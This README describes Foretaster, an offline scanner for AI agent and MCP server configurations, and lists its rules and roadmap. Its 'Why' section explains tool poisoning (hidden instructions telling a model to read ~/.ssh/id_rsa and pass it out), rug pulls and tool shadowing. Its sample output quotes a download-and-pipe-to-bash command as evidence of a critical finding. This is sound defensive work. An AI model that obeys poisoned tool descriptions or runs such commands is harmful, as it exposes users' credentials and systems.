# Foretaster

[![CI](https://github.com/timofeevilia/foretaster/actions/workflows/ci.yml/badge.svg)](https://github.com/timofeevilia/foretaster/actions/workflows/ci.yml)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)
![Status: pre-alpha](https://img.shields.io/badge/status-pre--alpha-orange.svg)

**A security scanner for AI agent configurations and MCP servers.**

A foretaster was the servant who tasted the king's food first, in case it was
poisoned. This tool does the same job for AI agents: it inspects the tools an
agent is about to trust and reports the poisoned ones before the agent
swallows them.

> **Status: pre-alpha.** Configuration scanning works. Inspecting the tools of
> a live MCP server, SARIF and HTML reports are not built yet. See the
> [roadmap](#roadmap).

## Why

AI agents connect to external tools through the
[Model Context Protocol](https://modelcontextprotocol.io) (MCP). Every tool
ships a natural-language description that the model reads and obeys. That
makes the description an attack surface:

- **Tool poisoning** — hidden instructions inside a tool description tell the
  model to read `~/.ssh/id_rsa` and pass it along as a harmless-looking
  argument.
- **Rug pulls** — a server shows a clean description when you approve it and
  swaps in a malicious one later.
- **Tool shadowing** — one server's description changes how the model uses
  another server's tools.
- **Plain misconfiguration** — secrets in config files, unpinned packages
  fetched on every start, servers reachable without TLS or authentication.

## Design principles

1. **Safe by default.** Starting a local MCP server means running someone
   else's code. By default Foretaster only reads configuration files. Connecting
   to a server is opt-in, and even then Foretaster lists tools and never calls
   them.
2. **No account, no network.** The deterministic rules run fully offline. An
   LLM-based layer for semantic checks is optional.
3. **Measured, not claimed.** Detection quality is reported against an open
   benchmark of deliberately vulnerable MCP servers, alongside other scanners.
4. **Mapped to standards.** Findings reference the
   [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/). A mapping to
   the OWASP Top 10 for Agentic Applications and SARIF export for GitHub code
   scanning are planned.

## Installation

Not published to PyPI yet. From a checkout:

```bash
uv sync
```

## Usage

Scan every agent configuration found on the machine and in the current project:

```bash
uv run foretaster scan
```

Scan specific files, for example the bundled sample:

```bash
uv run foretaster scan examples/risky-mcp.json
```

```text
CRITICAL FT-C004 Server is started through a shell command
  examples/risky-mcp.json:12 (server 'installer')
  Command downloads code and executes it immediately.
  Evidence: curl -s https://example.com/install.sh | bash
  Fix: Run the server binary directly with explicit arguments. Never pipe a download into an interpreter.
  OWASP MCP05:2025 Command Injection & Execution
  ...
Scanned 1 configuration file(s), 5 server(s). Findings: 1 critical, 2 high, 3 medium.
```

Options:

| Option | Meaning |
|---|---|
| `--format console\|json` | Report format. The JSON report has no timestamps, so equal inputs give byte-equal reports. |
| `--output FILE` | Write the report to a file instead of the terminal. |
| `--fail-on SEVERITY` | Lowest severity that makes the command fail: `critical`, `high` (default), `medium`, `low`, `info` or `never`. |
| `--project-dir DIR` | Where to look for project-level configuration. |

Exit status: `0` clean, `1` findings at or above `--fail-on`, `2` the scan was
incomplete (a file could not be parsed or a rule crashed). An incomplete scan is
never reported as clean.

Other commands: `foretaster discover` lists configuration files and servers
without scanning them, `foretaster rules` lists the rules.

Scanning only reads files: no server is started or contacted. Credentials never
reach a report. Rules redact what they quote, and every finding is scrubbed
again when it is created.

### Supported configuration files

| Client | User level | Project level |
|---|---|---|
| Claude Desktop | `claude_desktop_config.json` in the OS application-data directory | — |
| Claude Code | `~/.claude.json` | `.mcp.json` |
| Cursor | `~/.cursor/mcp.json` | `.cursor/mcp.json` |
| VS Code | `Code/User/mcp.json` in the OS application-data directory | `.vscode/mcp.json` |
| Windsurf | `~/.codeium/windsurf/mcp_config.json` | — |

Comments and trailing commas are accepted.

## Rules

Implemented:

| ID | Severity | Finds | OWASP MCP Top 10 |
|---|---|---|---|
| FT-C000 | low–medium | Entries the parser cannot interpret, and duplicate JSON keys: parsers disagree on which duplicate wins, so the agent may load a different server than a reviewer saw | — |
| FT-C001 | medium–high | Credentials in plain text: known token formats, and literal values under names such as `API_KEY`, in env, headers, arguments and URLs | MCP01 |
| FT-C002 | medium | Packages and images fetched at start-up without an exact version, commit hash or digest | MCP04 |
| FT-C003 | medium–high | Remote servers reached over `http://` or `ws://` | MCP07, MCP01 |
| FT-C004 | medium–critical | Servers started through an inline shell script; critical when the script downloads code and pipes it into an interpreter | MCP05, MCP04 |
| FT-C005 | medium–high | Package names one edit away from a well-known MCP server, or containing non-ASCII look-alike letters | MCP04 |
| FT-C006 | medium–high | Servers granted the filesystem root or a whole home directory, directly or through a container volume | MCP02 |

Planned for v0.1:

| Group | Checks |
|---|---|
| Poisoned tool descriptions | hidden instructions, invisible Unicode, references to sensitive files, "do not tell the user" directives, suspicious exfiltration parameters, cross-server tool references, encoded payloads, abnormal length |
| Change and conflict | tool description changed since baseline, tool name collisions across servers |
| Dangerous combinations | remote server without authentication; one agent holding private data access, untrusted input and an outbound channel at once |

Known limits: the rules are heuristics. FT-C001 can miss a secret that matches
no known format and sits under an innocent name. FT-C005 compares against a
short built-in list of popular packages.

## Development

```bash
uv run ruff check .
```

```bash
uv run ruff format --check .
```

```bash
uv run mypy
```

```bash
uv run pytest
```

CI runs the same four commands on Python 3.11, 3.12 and 3.13. Test coverage
below 90% fails the build.

## Roadmap

| Stage | Deliverable | State |
|---|---|---|
| 1 | Scanner core: config discovery, rule engine, 18 rules, JSON / SARIF / HTML reports | in progress |
| 2 | Open benchmark: corpus of vulnerable MCP servers, results for Foretaster and other scanners | planned |
| 3 | Project site: documentation, benchmark charts, in-browser config check | planned |
| 4 | GitHub Action, PyPI release, optional LLM layer | planned |
| 5 | Honeypot for attacks on AI infrastructure, feeding new rules | planned |

## Security

See [SECURITY.md](SECURITY.md) for how to report a vulnerability.

## License

[Apache-2.0](LICENSE)
